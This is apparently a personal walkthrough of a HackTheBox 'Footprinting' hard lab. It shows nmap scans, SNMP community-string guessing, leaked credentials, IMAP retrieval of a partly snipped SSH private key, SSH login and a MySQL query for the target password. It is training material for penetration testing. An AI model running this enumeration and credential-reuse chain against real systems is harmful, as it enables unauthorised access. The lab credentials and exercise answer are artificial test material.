# Fooprinting - Hard Lab

**Engagement Information:**

>The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named HTB was also created here, whose credentials we need to access.

---

**Goal:**

- *Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.*

---

**Enumeration:**

- nmap

```bash
$ sudo nmap -sV -sC -oN nmap.txt $htb -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 09:47 CDT
Nmap scan report for 10.129.202.20
Host is up (0.20s latency).
Not shown: 890 closed tcp ports (reset), 105 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
110/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_pop3-capabilities: STLS TOP UIDL PIPELINING RESP-CODES USER SASL(PLAIN) CAPA AUTH-RESP-CODE
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: ENABLE more LITERAL+ ID have LOGIN-REFERRALS SASL-IR IMAP4rev1 STARTTLS post-login listed capabilities Pre-login AUTH=PLAINA0001 OK IDLE
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: ENABLE LITERAL+ ID have LOGIN-REFERRALS SASL-IR IMAP4rev1 more post-login listed capabilities Pre-login IDLE OK AUTH=PLAINA0001
995/tcp open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: PIPELINING SASL(PLAIN) RESP-CODES TOP USER AUTH-RESP-CODE CAPA UIDL
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne
```

- My attempts to further enumerate the pop3/imap services failed.

- It did seem like something was missing so I ran a UDP scan:

```bash
$ sudo nmap -sV --top-port 100 -sU $htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 09:51 CDT
Nmap scan report for 10.129.202.20
Host is up (0.23s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT    STATE         SERVICE VERSION
68/udp  open|filtered dhcpc
161/udp open          snmp    net-snmp; net-snmp SNMPv3 server

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 215.88 seconds
```

- Now that we know SNMP is running lets enumerate that as well:

```bash
$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $htb
Scanning 1 hosts, 3219 communities
10.129.202.20 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```

- Community string `backup` found - lets go further:

```bash
─$ braa backup@$htb:.1.3.6.*
10.129.202.20:65ms:.0:Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
10.129.202.20:64ms:.0:.10
10.129.202.20:64ms:.0:93431
10.129.202.20:65ms:.0:Admin <tech@inlanefreight.htb>
10.129.202.20:64ms:.0:NIXHARD
10.129.202.20:49ms:.0:Inlanefreight

---SNIP---

10.129.202.20:62ms:.80:/opt/tom-recovery.sh
10.129.202.20:62ms:.80:tom NMds732Js2761

---SNIP---
```

Looks like we found a set of credentials `tom:NMds732Js2761`.

---

**Initial Access:**

- SSH failed needs cert.
- Logged into IMAP and found Toms? private key:

```bash
$ openssl s_client -connect $htb:imaps
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
a login tom NMds732Js2761
a OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
a select INBOX
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636509064] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
a OK [READ-WRITE] Select completed (0.022 + 0.000 + 0.021 secs).
a list "" *
* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX
a OK List completed (0.003 + 0.000 + 0.002 secs).
a fetch 1 BODY[TEXT]
* 1 FETCH (BODY[TEXT] {3430}
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn

---SNIP---

XvSb8cNlUIWdRwAAAAt0b21ATklYSEFSRAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

- Lets try SSH again with our new key:

```bash
$ chmod 600 rsa_key
$ ssh tom@$htb -i rsa_key
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 16 Aug 2025 03:11:40 PM UTC

  System load:  0.0               Processes:               166
  Usage of /:   70.0% of 5.40GB   Users logged in:         0
  Memory usage: 29%               IPv4 address for ens192: 10.129.202.20
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Nov 10 02:51:52 2021 from 10.10.14.20
tom@NIXHARD:~$
```

- Further enumeration shows mysql may be available:

```bash
cry0l1t3:x:1001:1001:,,,:/home/cry0l1t3:/bin/bash
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
tom:x:1002:1002:,,,:/home/tom:/bin/bash
dovecot:x:113:120:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
```

- Logged into mysql database and found "HTB" user password:

```bash
tom@NIXHARD:~$ mysql -u tom -p NMds732Js2761
Enter password:
ERROR 1049 (42000): Unknown database 'NMds732Js2761'
tom@NIXHARD:~$ mysql -u tom -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
5 rows in set (0.02 sec)

mysql> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

mysql> show columns from users;
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| id       | int         | YES  |     | NULL    |       |
| username | varchar(50) | YES  |     | NULL    |       |
| password | varchar(50) | YES  |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+
3 rows in set (0.00 sec)

mysql> select * from users where username like "HTB";
+------+----------+------------------------------+
| id   | username | password                     |
+------+----------+------------------------------+
|  150 | HTB      | ---SNIP---e7rzhnckhssncif7ds |
+------+----------+------------------------------+
1 row in set (0.00 sec)
```